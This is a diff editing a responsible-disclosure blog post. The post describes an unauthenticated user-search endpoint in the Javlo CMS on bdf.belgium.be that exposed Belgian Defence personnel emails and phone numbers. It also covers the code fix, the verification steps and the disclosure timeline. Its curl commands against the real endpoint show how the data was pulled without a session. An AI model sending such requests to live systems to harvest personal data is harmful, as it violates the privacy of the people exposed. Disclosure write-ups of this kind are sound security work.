@@ -6,13 +6,11 @@ tags: [responsible-disclosure, broken-access-control, cve, javlo-cms]
 excerpt: "Discovered a critical broken access control vulnerability in bdf.belgium.be that exposed sensitive user information including emails and phone numbers of military personnel without authentication. The vulnerability was found through source code analysis of the open-source Javlo CMS."
 ---
 
----
+A critical broken access control vulnerability in bdf.belgium.be's user search functionality allowed unauthenticated access to sensitive military personnel data. By analyzing the open-source Javlo CMS repository, I identified missing authentication checks in the AJAX endpoint that exposed emails, phone numbers, and organizational details of Belgian Defence personnel.
 
 ## Summary
 
 The user search functionality on bdf.belgium.be allowed unauthenticated users to access and retrieve sensitive user information without authentication checks. The AJAX endpoint `/ajax/en?webaction=user-search.ajaxsearch` returned user data including emails, phone numbers, and other personal information to any visitor.
-
----
 
 ## Discovery Process
 
@@ -99,8 +97,6 @@ if (users != null) {
 
 Both methods called UserFactory and AdminUserFactory directly without authentication validation.
 
----
-
 ## Exploitation
 
 ### Request
@@ -118,7 +114,7 @@ Content-Length: 10
 
 ```bash
 # Test without authentication
-curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
+curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch'
 
 # Result: HTTP 200 - Returns user data
 ```
@@ -126,7 +122,7 @@ curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
 ```bash
 # Test with invalid session
 curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
-  -H 'Cookie: JSESSIONID=INVALID_SESSION' \
+  -H 'Cookie: JSESSIONID=INVALID_SESSION'
 
 # Result: HTTP 200 - Still returns user data
 ```
@@ -149,8 +145,6 @@ curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
 }
 ```
 
----
-
 ## Impact
 
 1. Unauthorized access to all user PII
@@ -163,10 +157,6 @@ curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
 - OWASP Top 10 2021: A01:2021 - Broken Access Control
 - CWE-862: Missing Authorization
 - CVSS: 7.5 (High)
-
----
-
----
 
 ## The Fix
 
@@ -215,15 +205,13 @@ if (users != null && isAccess(ctx)) {
 }
 ```
 
----
-
 ## Verification
 
 Post-fix testing confirmed the vulnerability was resolved:
 
 ```bash
 # Unauthenticated request
-curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
+curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch'
 
 # Result: HTTP 403/500 - Access Denied
 ```
@@ -231,12 +219,10 @@ curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
 ```bash
 # Authenticated with valid role
 curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
-  -H 'Cookie: JSESSIONID=[valid_session_with_role]' \
+  -H 'Cookie: JSESSIONID=[valid_session_with_role]'
 
 # Result: HTTP 200 - Access granted (as intended)
 ```
-
----
 
 ## Timeline
 
@@ -248,10 +234,9 @@ curl -X POST 'https://bdf.belgium.be/ajax/en?webaction=user-search.ajaxsearch' \
 - **January 5, 2026** - Patch deployed
 - **January 5, 2026** - Public disclosure
 
----
-
 ## References
 
 - GitHub: [https://github.com/Javlo/javlo](https://github.com/Javlo/javlo)
 - OWASP A01:2021: [https://owasp.org/Top10/A01_2021-Broken_Access_Control/](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
 - CWE-862: [https://cwe.mitre.org/data/definitions/862.html](https://cwe.mitre.org/data/definitions/862.html)
+```
